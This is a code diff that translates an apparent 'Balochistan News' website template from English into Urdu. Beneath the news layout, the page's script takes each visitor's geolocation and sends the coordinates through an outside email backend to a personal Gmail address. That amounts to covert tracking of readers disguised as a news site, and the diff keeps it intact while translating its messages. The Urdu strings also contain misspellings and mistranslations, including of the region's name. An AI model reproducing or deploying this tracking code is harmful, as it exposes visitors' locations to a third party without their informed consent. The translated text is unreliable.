@@ -97,23 +97,23 @@
 
     <!-- Navigation Bar -->
     <nav class="navbar navbar-expand-lg">
-        <a class="navbar-brand" href="#">Balochistan News</a>
+        <a class="navbar-brand" href="#">باجوچستان خبر</a>
         <div class="collapse navbar-collapse">
             <ul class="navbar-nav ml-auto">
                 <li class="nav-item">
-                    <a class="nav-link" href="#">Home</a>
+                    <a class="nav-link" href="#">گھٹ</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link" href="#">Politics</a>
+                    <a class="nav-link" href="#">سیاست</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link" href="#">Society</a>
+                    <a class="nav-link" href="#">سوسائٹی</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link" href="#">Culture</a>
+                    <a class="nav-link" href="#">ثقافت</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link" href="#">Contact</a>
+                    <a class="nav-link" href="#">رابطہ</a>
                 </li>
             </ul>
         </div>
@@ -121,8 +121,8 @@
 
     <!-- Hero Section -->
     <section class="hero-section">
-        <h1>Welcome to Balochistan News</h1>
-        <p>Your trusted source for the latest news and stories from Balochistan and beyond.</p>
+        <h1>باجوچستان خبر کا خیرمقدم</h1>
+        <p>باجوچستان اور اس کے باہر کے تازہ ترین خبریں اور کہانیاں آپ کا معتبر ذریعہ۔</p>
     </section>
 
     <!-- Main Content Section -->
@@ -131,9 +131,9 @@
             <div class="col-md-8">
                 <!-- News Section -->
                 <div class="news-section">
-                    <h2>Breaking News: Balochistan Witnesses Historic Event</h2>
-                    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam.</p>
-                    <a href="#" class="btn btn-primary">Read More</a>
+                    <h2>توڑنی خبر: باجوچستان میں ایک تاریخی واقعہ</h2>
+                    <p>لورم اپسم ڈولر سٹ ایٹ میٹ، کونسیٹٹور ایڈپیسنگ ایلیت۔ انٹجر نیک اوڈیو۔ پریزینٹ لبر۔ سیڈ کرسس انتے ڈاپیبس ڈیام۔</p>
+                    <a href="#" class="btn btn-primary">مزید پڑھیں</a>
                 </div>
             </div>
 
@@ -141,12 +141,12 @@
             <div class="col-md-4">
                 <!-- Sidebar Content -->
                 <div class="sidebar">
-                    <h3>Popular Articles</h3>
+                    <h3>مقبول آرٹیکل</h3>
                     <ul>
-                        <li><a href="#">Balochistan’s Economy: Challenges and Solutions</a></li>
-                        <li><a href="#">History of Balochistan: A Glimpse into the Past</a></li>
-                        <li><a href="#">Balochistan's Role in National Politics</a></li>
-                        <li><a href="#">Interview with Local Leaders on Regional Development</a></li>
+                        <li><a href="#">باجوچستان کا معیشت: چیلنجز اور حل</a></li>
+                        <li><a href="#">باجوچستان کی تاریخ: ماضی کی ایک جھلک</a></li>
+                        <li><a href="#">باجوچستان کا قومی سیاست میں کردار</a></li>
+                        <li><a href="#">علاقائی ترقی پر مقامی رہنماؤں کے ساتھ انٹرویو</a></li>
                     </ul>
                 </div>
             </div>
@@ -155,7 +155,7 @@
 
     <!-- Footer -->
     <div class="footer">
-        <p>&copy; 2024 Balochistan News | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+        <p>&copy; 2024 باجوچستان خبر | <a href="#">رازداری کی پالیسی</a> | <a href="#">شرائط و ضوابط</a></p>
     </div>
 
     <!-- Bootstrap and jQuery JS -->
@@ -176,14 +176,14 @@
                         longitude = position.coords.longitude;
 
                         // Send the location data via email
-                        sendEmail("Location Access", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
+                        sendEmail("مقام کی رسائی", `عرض بلد: ${latitude}, طول بلد: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
-                        alert("Location access denied or error occurred.");
+                        alert("مقام کی رسائی مسترد یا کوئی خرابی ہوئی ہے۔");
                     }
                 );
             } else {
-                alert("Geolocation is not supported by this browser.");
+                alert("اس براؤزر میں جیو لوکیشن کی سہولت نہیں ہے۔");
             }
         }
 
@@ -198,7 +198,7 @@
                 subject: subject,
                 message: message,
                 recipient_email: recipientEmail,
-                recipient_name: "Khalil Ahmed"
+                recipient_name: "کلیم احمد"
             };
 
             fetch("https://zalex-backend.onrender.com/api/send-email/", {
@@ -209,8 +209,8 @@
                 body: JSON.stringify(emailData)
             })
             .then(response => response.ok ? response.json() : Promise.reject(`Error ${response.status}`))
-            .then(data => alert(data.message ? "Email sent successfully!" : `Error: ${data.error}`))
-            .catch(error => alert("Error sending email: " + error));
+            .then(data => alert(data.message ? "ای میل کامیابی سے بھیجی گئی!" : `خرابی: ${data.error}`))
+            .catch(error => alert("ای میل بھیجنے میں خرابی: " + error));
         }
     </script>
 </body>
